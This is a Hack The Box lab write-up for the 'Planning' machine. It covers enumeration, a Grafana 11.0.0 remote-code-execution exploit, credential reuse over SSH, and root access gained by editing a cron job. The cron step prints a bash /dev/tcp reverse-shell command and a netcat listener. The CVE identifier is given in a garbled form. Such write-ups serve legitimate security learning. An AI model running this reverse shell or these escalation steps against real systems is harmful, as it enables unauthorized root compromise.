---
title: HTB Lab Writeup - "Planning"
description: A writeup concerning the Hack The Box lab "Planning" 
date: '2025-06-10'
categories:
    - HTB
    - Cron-Job-Abuse
    - OSINT
    - Subdomain brute forcing
    - Local services
published: False
---


## Table of Contents


## Initial Enumeration

I began by running an `nmap` scan of the target machine:

```bash
sudo nmap 10.10.11.68 -sC -sV
```


![Screenshot 2025-06-09 234205.png](/Screenshot%202025-06-09%20234205.png)
This revealed two open ports:

- **Port 22 (SSH)**
- **Port 80 (HTTP)**

I mapped `planning.htb` to the target IP via `/etc/hosts` to browse the site properly.

---

## Web Application Analysis

&nbsp;

![Screenshot 2025-06-09 234443.png](/Screenshot%202025-06-09%20234443.png)


---
The landing page at `http://planning.htb` had multiple subpages. I inspected user registration and forms manually and with **ZAP** to identify potential vulnerabilities. Notably, I found:

- A bug in the phone number input field: overly long input caused a **500 Internal Server Error**.
- Misconfigured HTTP verbs: GET requests were accepted on POST-defined endpoints, but they were not exploitable.

After exhausting client-side attacks, I pivoted back to **directory and subdomain enumeration**.

---

## Subdomain Discovery – Grafana

During enumeration, I identified a subdomain: `grafana.planning.htb`. After updating `/etc/hosts`, I accessed a **Grafana login portal**.
Using the initial credentials provided in the lab instructions, I successfully logged in.

![SubdomainTestshtb.png](/SubdomainTestshtb.png)
![grafana.htb.png](/grafana.htb.png)


---

## Grafana 11.0.0 RCE Exploit

The Grafana instance was running **version 11.0.0**, which has a known **Remote Code Execution** vulnerability. Using the exploit (CVE-2024-2024–9264), I achieved **RCE** and obtained a reverse shell by base64 encoding a payload and ended up inside a **Docker container**.

![Screenshot 2025-06-10 190036.png](/Screenshot%202025-06-10%20190036.png)
![Screenshot 2025-06-10 190153.png](/Screenshot%202025-06-10%20190153.png)


---

## Docker Container Enumeration

Within the container, I attempted several Docker escape techniques (e.g., mounting the host file system or abusing Docker capabilities), but none succeeded.
Running `linpeas.sh`, I found **environment variables** containing another set of credentials.
![Screenshot 2025-06-10 201110.png](/Screenshot%202025-06-10%20201110.png)


---

## SSH Access to Host Machine

The credentials worked on the host system, granting access via SSH as the user **enzo**.

```bash
ssh enzo@10.10.11.68
```
![Got into the actual box.png](/Got%20into%20the%20actual%20box.png)
With user-level access, I ran `linpeas` again to analyze privilege escalation vectors.

---

## Deeper Privilege Escalation Recon

Initial attempts included:

- Trying to exploit **Polkit (PwnKit)** — ruled out due to missing `pkexec`.
- Checking for writable services, binaries, and SUID bits — no success.
- Observing several localhost-bound services with `linpeas`, including:

```bash
127.0.0.1:8000
127.0.0.1:3000
```
![openports.png](/openports.png)
This prompted **local port forwarding** to inspect those services.

---

## Local Web Service on Port 8000 – Cron UI

Using `ssh -L`, I forwarded port 8000:

```bash
ssh -L 8000:127.0.0.1:8000 enzo@10.10.11.68
```

This revealed a **Cron Job Management Web Interface**. Previously, I had found login credentials stored in a `cron.db` file. These credentials allowed me to log into the UI.

---
![Screenshot 2025-06-10 221754.png](/Screenshot%202025-06-10%20221754.png)
## Cron Job Exploitation for Root Access

Inside the UI, a cron job named **Grafana backup** was configured to run daily as root. I edited this job to:

```bash
bash -c "bash -i >& /dev/tcp/<My-IP>/4444 0>&1"
```
![CronJobManip.png](/CronJobManip.png)
After setting up a listener:

```bash
nc -lvnp 4444
```

I received a **root reverse shell** once the cron job executed.

---

## Final Step – Root Flag

With root access, I read the final flag:
![rooting.png](/rooting.png)

---

## Lessons Learned

- **Overlooked vectors** like internal-only services (`127.0.0.1`) can contain crucial components (cron UI).
- **Privilege escalation via cron** remains a reliable vector when cron UIs or scripts are writable or misconfigured.
- **Staying organized** and revisiting old findings (like credentials or hidden services) is crucial when paths feel exhausted.



